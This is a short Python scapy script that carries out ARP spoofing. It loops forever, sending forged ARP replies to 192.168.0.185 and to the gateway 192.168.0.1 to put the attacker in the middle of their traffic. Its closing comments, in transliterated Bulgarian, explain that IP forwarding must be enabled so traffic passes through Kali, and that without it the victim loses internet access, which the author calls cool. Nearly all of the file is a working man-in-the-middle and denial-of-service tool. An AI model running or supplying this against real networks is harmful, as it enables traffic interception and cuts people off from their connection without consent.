#!usr/bin/env python3

"""
>>> scapy.ls(scapy.ARP)
hwtype     : XShortField                         = (1)
ptype      : XShortEnumField                     = (2048)
hwlen      : FieldLenField                       = (None)
plen       : FieldLenField                       = (None)
op         : ShortEnumField                      = (1)
hwsrc      : MultipleTypeField                   = (None)
psrc       : MultipleTypeField                   = (None)
hwdst      : MultipleTypeField                   = (None)
pdst       : MultipleTypeField                   = (None)

"""

import scapy.all as scapy 
import time

def get_mac(ip):                                                                                                   
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #broadcast MAC
    arp_request_broadcast = broadcast/arp_request # combine the two varaibles (scapy allows us to do that) it is called packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

#get_mac("192.168.0.185")


while True:
    spoof("192.168.0.185", "192.168.0.1")
    spoof("192.168.0.1", "192.168.0.185")
    time.sleep(2)

#za da raboti tva trqa da se pusne ip_forward - za da moje da ti minava trafika in out ot kali
#ako ne se sloji stava internet jammer i 192.168.0.185 nqma da ima internet, koeto e qko